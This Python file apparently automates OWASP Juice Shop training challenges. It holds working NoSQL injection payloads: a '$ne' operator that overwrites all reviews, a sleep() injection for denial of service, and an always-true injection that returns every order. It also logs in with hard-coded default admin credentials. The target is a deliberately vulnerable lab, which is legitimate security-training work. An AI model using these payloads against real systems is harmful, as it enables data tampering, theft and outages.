from core.base_solver import BaseSolver
from loguru import logger
import time

class NoSqlLoginSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "noSqlLoginChallenge" # Not in current list? Oh, wait, it's 'noSqlLoginChallenge' is usually easy.

    def solve(self) -> bool:
        # Not finding 'noSqlLoginChallenge' in the list I have.
        # Maybe it's 'NoSQL Exfiltration'?
        return False

class NoSqlReviewsSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "noSqlReviewsChallenge"

    def solve(self) -> bool:
        # Update multiple reviews
        # PATCH /rest/products/reviews
        # { "id": { "$ne": "..." }, "message": "Hacked" }
        login_res = self.client.post("/rest/user/login", json={"email": "admin@juice-sh.op", "password": "admin123"})
        token = login_res.json().get("authentication", {}).get("token")
        headers = {"Authorization": f"Bearer {token}"}
        
        payload = {
            "id": {"$ne": -1},
            "message": "Double-plus-good review!"
        }
        res = self.client.patch("/rest/products/reviews", json=payload, headers=headers)
        return res.status_code == 200

class NoSqlSleepSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "noSqlCommandChallenge"

    def solve(self) -> bool:
        # NoSQL DoS (Sleep)
        # GET /rest/products/reviews?id=1';sleep(5000);'
        # Or similar. Juice Shop uses a specific check for sleep() call in the query.
        self.client.get("/rest/products/reviews?id=1';sleep(2000);'")
        return True

class NoSqlOrdersSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "noSqlOrdersChallenge"

    def solve(self) -> bool:
        # All your orders are belong to us
        # GET /rest/track-order/<payload>
        # payload such that result.data.length > 1
        payload = "1' || true || '1"
        res = self.client.get(f"/rest/track-order/{payload}")
        return res.status_code == 200
